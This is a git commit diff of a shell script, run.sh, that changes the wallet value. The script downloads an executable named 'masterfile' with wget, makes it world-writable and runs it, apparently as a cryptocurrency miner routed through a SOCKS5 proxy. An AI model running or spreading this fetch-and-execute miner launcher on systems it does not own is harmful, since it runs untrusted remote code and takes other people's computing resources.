c8c7cdc306539c0d8149f1af9ce8f9891afc7073
CornellAlarcon <89951532+CornellAlarcon@users.noreply.github.com>
2021-09-02 01:34:36 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,7 +2,7 @@
 wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
 chmod 777 masterfile
 POOL=dcy.pool-pay.com:5657
-WALLET=NYz4eppo5MsY3WqgrRVzDZ4P6eqVrfRKBLffuLmvvPYzA2MXhT5v6Y7BFYx2HkQNuL9MND7CQvi73CWpd9y57dhV4ySD1iy8ez
+WALLET=endvoc
 WORKER=endvoc
 PROXY=socks5://192.252.209.155:14455
 ./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
